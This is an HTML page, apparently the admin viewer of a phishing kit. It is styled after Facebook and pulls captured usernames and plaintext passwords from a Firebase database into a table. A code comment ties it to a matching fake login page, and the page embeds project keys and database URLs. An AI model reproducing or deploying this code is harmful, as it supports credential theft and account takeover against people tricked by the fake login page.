<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Collected Data</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 20px;
            color: #1c1e21;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        
        h1 {
            color: #1877f2;
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid #dddfe2;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #dddfe2;
        }
        
        th {
            background-color: #f5f6f7;
            font-weight: 600;
            color: #4b4f56;
        }
        
        tr:hover {
            background-color: #f5f6f7;
        }
        
        .timestamp {
            white-space: nowrap;
        }
        
        @media (max-width: 768px) {
            table {
                display: block;
                overflow-x: auto;
            }
            
            .container {
                padding: 15px;
            }
            
            th, td {
                padding: 8px 10px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ“Š Collected User Data</h1>
        <table id="dataTable">
            <thead>
                <tr>
                    <th>User-Name</th>
                    <th>Password</th>
                    <th class="timestamp">Timestamp</th>
                </tr>
            </thead>
            <tbody id="tableBody"></tbody>
        </table>
    </div>

    <script>
        // Firebase configuration (must match your login page config)
        const firebaseConfig = {
            apiKey: "AIzaSyCpbb9kKDgD3sly6hjSe1I55mIlqKsa5JM",
            authDomain: "systeam-d12d0.firebaseapp.com",
            databaseURL: "https://systeam-d12d0-default-rtdb.firebaseio.com",
            projectId: "systeam-d12d0",
            storageBucket: "systeam-d12d0.appspot.com",
            messagingSenderId: "938749422010",
            appId: "1:938749422010:web:097e3432289f20ac3fd583",
            measurementId: "G-FC1TNMV0SH"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Fetch and display data
        database.ref('users').on('value', (snapshot) => {
            const tableBody = document.getElementById('tableBody');
            tableBody.innerHTML = ''; // Clear previous data

            if (!snapshot.exists()) {
                tableBody.innerHTML = '<tr><td colspan="3" style="text-align: center;">No data found</td></tr>';
                return;
            }

            snapshot.forEach((childSnapshot) => {
                const data = childSnapshot.val();
                const row = document.createElement('tr');
                
                row.innerHTML = `
                    <td>${data.name || 'N/A'}</td>
                    <td>${data.password || 'N/A'}</td>
                    <td class="timestamp">${formatTimestamp(data.timestamp)}</td>
                `;
                
                tableBody.appendChild(row);
            });
        }, (error) => {
            console.error("Error fetching data:", error);
            document.getElementById('tableBody').innerHTML = `
                <tr>
                    <td colspan="3" style="text-align: center; color: red;">
                        Error loading data. Check console for details.
                    </td>
                </tr>
            `;
        });

        function formatTimestamp(timestamp) {
            if (!timestamp) return 'N/A';
            const date = new Date(timestamp);
            return date.toLocaleString();
        }
    </script>
</body>
</html>
